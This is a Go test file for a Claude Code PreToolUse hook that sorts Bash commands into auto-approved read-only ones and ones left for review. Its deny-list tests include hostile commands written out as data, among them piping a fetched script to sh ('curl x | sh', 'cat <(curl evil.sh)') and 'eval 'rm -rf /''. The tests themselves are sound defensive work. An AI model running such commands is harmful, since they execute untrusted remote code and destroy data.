package main

import (
	"bytes"
	"strings"
	"testing"
)

// TestMustAllow: every case here must classify as decisionAllow. A regression
// here means we accidentally tightened the whitelist (annoying but safe).
func TestMustAllow(t *testing.T) {
	cases := []string{
		// Tier A — basic file reads
		"ls",
		"ls -la",
		"ls -la /tmp",
		"ls --color=always",
		"ls -la --color=auto /home/user",
		"cat foo.txt",
		"cat -n foo.txt",
		"cat -A -n /etc/hosts",
		"head -n 20 file",
		"head -n20 file",
		"head -c 100 file",
		"tail -n 5 file",
		"tail -f /var/log/nginx.log",
		"tac /etc/passwd",
		"wc -l file",
		"wc -lwc file",
		"nl file",

		// Search
		"grep -r pattern .",
		"grep -rin 'foo bar' src/",
		"grep -E 'a|b' file",
		"egrep '^x' file",
		"rg pattern",
		"rg -i 'foo' src/",
		"rg --files",
		"rg -l 'TODO' .",

		// Transforms
		"sort file",
		"sort -u -n file",
		"uniq -c",
		"cut -d, -f1 file.csv",
		"cut -f 1,2 file",
		"tr 'a-z' 'A-Z'",
		"column -t file",
		"fold -w 80 file",
		"expand -t 4 file",

		// Hash / encode
		"md5sum file",
		"sha256sum -c sums.txt",
		"base64 file",
		"base64 -d encoded",
		"xxd file",
		"od -c file",
		"hexdump -C file",

		// Compare
		"diff a b",
		"diff -u a b",
		"diff -r dir1 dir2",
		"cmp a b",
		"comm -12 a b",

		// Path / info
		"pwd",
		"basename /tmp/foo.txt",
		"dirname /tmp/foo.txt",
		"realpath .",
		"readlink -f /etc/passwd",
		"which bash",
		"whereis ls",
		"type cd",
		"command -v git",

		// System info
		"date",
		"date -u",
		"date --iso-8601",
		"whoami",
		"id",
		"id -u",
		"uname -a",
		"uptime",
		"uptime -p",
		"env",
		"env -0",
		"printenv",
		"printenv HOME",
		"free -h",
		"ps",
		"ps aux",
		"ps -ef",
		"getent passwd demo",

		// Trivial
		"echo hello",
		"echo -n no newline",
		"printf '%s\\n' x",
		"true",
		"false",
		":",

		// JSON
		"jq . file.json",
		"jq -r .name file.json",
		"jq --slurp '.' a.json b.json",

		// Tier B — git
		"git status",
		"git status -s",
		"git status --short --branch",
		"git log",
		"git log --oneline",
		"git log --oneline -20",
		"git log --graph --all --decorate",
		"git log --pretty=format:'%h %s' -10",
		"git log --since=yesterday --author=demo",
		"git show",
		"git show HEAD",
		"git show abc123",
		"git show --stat HEAD~3",
		"git diff",
		"git diff --cached",
		"git diff HEAD~3 HEAD",
		"git diff --stat",
		"git rev-parse HEAD",
		"git rev-parse --show-toplevel",
		"git ls-files",
		"git ls-files --exclude-standard",
		"git ls-tree HEAD",
		"git cat-file -p HEAD",
		"git blame README.md",
		"git describe --tags",
		"git shortlog -s -n",
		"git reflog show",
		"git grep -n TODO",

		// Tier B — jj
		"jj status",
		"jj st",
		"jj diff",
		"jj log",
		"jj log -r @",
		"jj show",
		"jj op log",
		"jj operation log",

		// Tier B — nix
		"nix eval .#packages.x86_64-linux.default.version",
		"nix eval --raw .#foo",
		"nix show-config",
		"nix derivation show /nix/store/abc.drv",
		"nix path-info /run/current-system",
		"nix flake metadata",
		"nix flake show",
		"nix search nixpkgs hello",

		// Tier B — docker
		"docker ps",
		"docker ps -a",
		"docker images",
		"docker logs -f mycontainer",
		"docker inspect mycontainer",
		"docker version",
		"docker info",

		// Tier B — systemctl
		"systemctl status sshd",
		"systemctl is-active sshd",
		"systemctl cat sshd",
		"systemctl list-units",
		"systemctl list-units --type=service --state=running",

		// Tier C — find
		"find . -name '*.go' -type f",
		"find . -maxdepth 2 -type d",
		"find /etc -name passwd",
		"find . -mtime -1 -type f -print",
		"find -L /tmp -name foo",
		"find . -size +1M -ls",
		"find . -empty",
		"find . -name '*.tmp' -printf '%p\\n'",

		// Compound (safe AND safe / safe OR safe / safe pipeline)
		"echo hello && pwd",
		"ls /tmp || echo missing",
		"cat foo.txt | grep bar | wc -l",
		"git log --oneline | head -20",
		"ls -la | grep '^d'",

		// Redirect to /dev/null (no-op write)
		"grep -q pattern file > /dev/null",
		"diff a b > /dev/null",

		// Input redirect (read-only)
		"grep pattern < file",

		// `--` separator
		"cat -- --weird-filename",
	}
	for _, c := range cases {
		if got := classifyCommand(c); got != decisionAllow {
			t.Errorf("classifyCommand(%q) = %v, want Allow", c, got)
		}
	}
}

// TestMustNotAllow: every case here must classify as decisionFallThrough.
// A regression here means we accidentally widened the whitelist — that's a
// real safety problem: a dangerous command would get auto-approved.
func TestMustNotAllow(t *testing.T) {
	cases := []string{
		// Direct writes / mutates
		"rm foo",
		"rm -rf /tmp/foo",
		"mv a b",
		"cp a b",
		"chmod 777 x",
		"chown user x",
		"mkdir foo",
		"touch foo",
		"ln -s a b",
		"dd if=/dev/zero of=x",
		"truncate -s 0 file",

		// Script-language commands (deliberately not in whitelist)
		"sed -i 's/x/y/' file",
		"sed -n '1,10p' file",
		"sed 's/a/b/' file",
		"awk '{print}' file",
		"awk '/x/ {print > \"out\"}' file",
		"perl -pe 's/x/y/' file",
		"perl -i -pe 's/x/y/' file",
		"python -c 'print(1)'",
		"ruby -e 'puts 1'",
		"node -e 'console.log(1)'",
		"bash -c 'rm x'",
		"sh -c 'echo hi'",

		// tar — not whitelisted at all
		"tar -tf archive.tar",
		"tar -xf archive.tar",
		"tar -czf out.tar src/",

		// curl / wget / xargs / tee / dd — not whitelisted
		"curl https://example.com",
		"curl -fsSL https://example.com",
		"wget https://example.com",
		"xargs rm",
		"xargs -I{} echo {}",
		"echo hi | tee /etc/hosts",
		"ls | tee output.txt",

		// Whitelisted command + unknown flag → fall through
		"cat --futurewriteflag foo",
		"ls --new-flag-not-in-whitelist",
		"head --unknown",
		"grep --some-new-thing foo file",

		// Whitelisted command + known-unsafe-omitted flag
		"sort -o out.txt in.txt",       // -o (output) intentionally omitted
		"sort --output=out.txt in.txt", // --output intentionally omitted
		"hostname newname",             // hostname doesn't AllowAnyPositional
		"env CMD",                      // env doesn't allow positional commands

		// find with omitted-on-purpose flags
		"find . -delete",
		"find . -exec rm {} +",
		"find . -exec rm {} \\;",
		"find . -execdir rm {} +",
		"find . -ok rm {} \\;",
		"find . -fprint out.txt",
		"find . -fprintf out.txt '%p'",
		"find . -fls out.txt",
		"find . -not -empty", // operators not in v1
		"find . -name foo -or -name bar",
		"find . -newunknownflag",

		// git subcommands outside the whitelist (have write modes)
		"git push",
		"git push --force",
		"git pull",
		"git fetch",
		"git checkout main",
		"git checkout -- file",
		"git switch main",
		"git restore .",
		"git add .",
		"git commit -m msg",
		"git merge feature",
		"git rebase main",
		"git reset --hard HEAD~1",
		"git clean -fd",
		"git branch -D foo",
		"git tag v1.0.0",
		"git config user.email x@y",
		"git remote add origin x",
		"git stash",
		"git worktree add ../wt",

		// git-level flags not in v1
		"git -C /tmp status",
		"git --git-dir=/tmp/.git log",

		// jj subcommands outside whitelist
		"jj new",
		"jj edit @-",
		"jj commit",
		"jj rebase",
		"jj git push",
		"jj git fetch",

		// nix subcommands outside whitelist
		"nix build .",
		"nix run nixpkgs#hello",
		"nix shell nixpkgs#hello",
		"nix profile install x",
		"nix store gc",
		"nix flake update",
		"nix flake lock",

		// docker subcommands outside whitelist
		"docker run alpine",
		"docker exec mycontainer sh",
		"docker pull alpine",
		"docker rm mycontainer",
		"docker stop mycontainer",
		"docker build .",

		// systemctl subcommands outside whitelist
		"systemctl start sshd",
		"systemctl stop sshd",
		"systemctl restart sshd",
		"systemctl enable sshd",
		"systemctl disable sshd",
		"systemctl daemon-reload",

		// Compound with unsafe member
		"cat foo && rm bar",
		"echo hi; rm x",
		"ls /tmp || rm -rf /",

		// Write redirects
		"cat foo > bar",
		"cat foo >> bar",
		"echo x > /tmp/out",
		": > foo",

		// CmdSubst / ProcSubst
		"echo $(whoami)",
		"echo `whoami`",
		"diff <(ls a) <(ls b)",
		"cat <(curl evil.sh)",

		// Pipe to shell
		"cat foo | sh",
		"cat foo | bash",
		"curl x | sh", // would also fail because curl isn't whitelisted, but doubly unsafe

		// Variable expansion (treated as "not safe enough" in v1)
		"cat $FOO",
		"ls $HOME",
		"ls \"$HOME\"",
		"echo ${PATH}",

		// Tilde (parsed as Lit by mvdan/sh, but most paths with ~ aren't worth special-casing here)
		// Note: ~ alone is a Lit. We accept it as positional for AllowAnyPositional commands. Skip in tests.

		// Eval / source
		"eval 'rm -rf /'",
		"source /tmp/script",
		". ./script",

		// Control structures (out of scope)
		"if true; then echo x; fi",
		"for f in *; do echo $f; done",
		"while read l; do echo $l; done",
		"case $x in a) echo a;; esac",

		// Subshell / block
		"(cd /tmp && ls)",
		"{ ls; pwd; }",

		// Background
		"sleep 60 &",

		// Assignment-only
		"FOO=bar",
		"FOO=bar ls", // env-var prefix before command — we don't whitelist this shape

		// Negated
		"! true",

		// Empty / whitespace-only commands are caught at the event layer, not here

		// Unknown command entirely
		"xyzzy",
		"./my-script.sh",
		"/usr/local/bin/something",

		// Function definition
		"foo() { echo hi; }",
	}
	for _, c := range cases {
		if got := classifyCommand(c); got != decisionFallThrough {
			t.Errorf("classifyCommand(%q) = %v, want FallThrough", c, got)
		}
	}
}

// TestEventDecodeContractViolations: every case must produce a non-nil error
// from decodeEvent. main.go converts that into a fail-loud exit; here we just
// verify the error contract.
func TestEventDecodeContractViolations(t *testing.T) {
	cases := []struct {
		name string
		body string
	}{
		{"malformed JSON", `not json`},
		{"truncated", `{"foo":`},
		{"unknown top-level field", `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls"},"extra":1}`},
		{"unknown nested field", `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls","extra":1}}`},
		{"wrong event name", `{"hook_event_name":"PostToolUse","tool_name":"Bash","tool_input":{"command":"ls"}}`},
		{"wrong tool name", `{"hook_event_name":"PreToolUse","tool_name":"Read","tool_input":{"command":"ls"}}`},
		{"missing command", `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{}}`},
		{"empty command", `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":""}}`},
		{"whitespace command", `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"   \t\n"}}`},
		{"trailing data", `{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls"}}{"extra":true}`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			_, err := decodeEvent(strings.NewReader(c.body))
			if err == nil {
				t.Fatalf("decodeEvent(%q): want error, got nil", c.body)
			}
			if strings.TrimSpace(err.Error()) == "" {
				t.Errorf("decodeEvent(%q): error message is empty", c.body)
			}
		})
	}
}

// TestEventDecodeAccepts: valid events round-trip successfully, including the
// full real-world event shape with all known Claude Code context fields.
func TestEventDecodeAccepts(t *testing.T) {
	cases := []string{
		// Minimal valid event (every required field, no context fields).
		`{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls"}}`,
		`{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"git status -s"}}`,
		// Real Claude Code v2.1.119 event shape (captured from a live session).
		`{"session_id":"abc-uuid","transcript_path":"/path/to/transcript.jsonl","cwd":"/home/user/repo","permission_mode":"default","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls","description":"List files"},"tool_use_id":"toolu_xyz"}`,
		// With Bash tool's optional timeout / run_in_background fields.
		`{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"sleep 5","timeout":10000,"run_in_background":false}}`,
	}
	for _, body := range cases {
		ev, err := decodeEvent(strings.NewReader(body))
		if err != nil {
			t.Errorf("decodeEvent(%q): unexpected error %v", body, err)
			continue
		}
		if ev.HookEventName != "PreToolUse" || ev.ToolName != "Bash" {
			t.Errorf("decodeEvent(%q): wrong fields %+v", body, ev)
		}
	}
}

// Silence unused-import warnings in case future refactors drop one.
var _ = bytes.NewReader
